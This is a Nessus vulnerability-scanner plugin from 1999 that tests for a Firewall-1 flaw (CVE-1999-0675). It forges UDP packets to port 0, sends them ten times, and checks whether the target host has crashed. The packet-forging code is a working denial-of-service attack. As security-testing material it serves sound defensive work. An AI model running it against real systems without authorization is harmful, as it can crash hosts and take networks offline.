#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10074);
 script_version ("$Revision$");
 script_bugtraq_id(576);
 script_cve_id("CVE-1999-0675");
 name["english"] = "Firewall/1 UDP port 0 DoS";
 name["francais"] = "D�ni de service Firewall/1 port 0 udp";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to
crash either the remote host or the firewall
in between us and the remote host by sending
an UDP packet going to port 0.

This flaw may allow an attacker to shut down
your network.

Solution : contact your firewall vendor if
it was the firewall which crashed, or filter
incoming UDP traffic if the remote host crashed.

Risk factor : High";


 desc["francais"] = "Il s'est av�r� possible
de faire planter le syst�me distant ou le firewall
situ� entre nous et le syst�me distant en envoyant
un paquet UDP allant vers le port 0.

Ce probl�me peut permettre � un pirate de mettre
hors d'�tat de marche tout votre r�seau. 


Solution : contactez l'�diteur du firewall pour
un patch si c'est celui-ci qui a plant�, ou alors
filtrez le traffic UDP si c'est la machine distante
qui a plant�.

Facteur de risque : Elev�";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote host by sending a UDP packet going to port 0";
 summary["francais"] = "Tue le serveur distant en envoyant un packet UDP sur le port 0";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "D�ni de service";
 script_family(english:family["english"], francais:family["francais"]);

 
 exit(0);
}

#
# The script code starts here
#

start_denial();


ip = forge_ip_packet(ip_v   : 4,
		     ip_hl  : 5,
		     ip_tos : 0,
		     ip_id  : 0x4321,
		     ip_len : 28,
		     ip_off : 0,
		     ip_p   : IPPROTO_UDP,
		     ip_src : this_host(),
		     ip_ttl : 0x40);

# Forge the UDP packet
	    
udp = forge_udp_packet( ip : ip,
			uh_sport : 1234, uh_dport : 0,
			uh_ulen : 8);		     


#
# Send this packet 10 times
#

send_packet(udp, pcap_active:FALSE) x 10;	

#
# wait
#
sleep(5);

#
# And check...
#
alive = end_denial();
if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(0);
                }
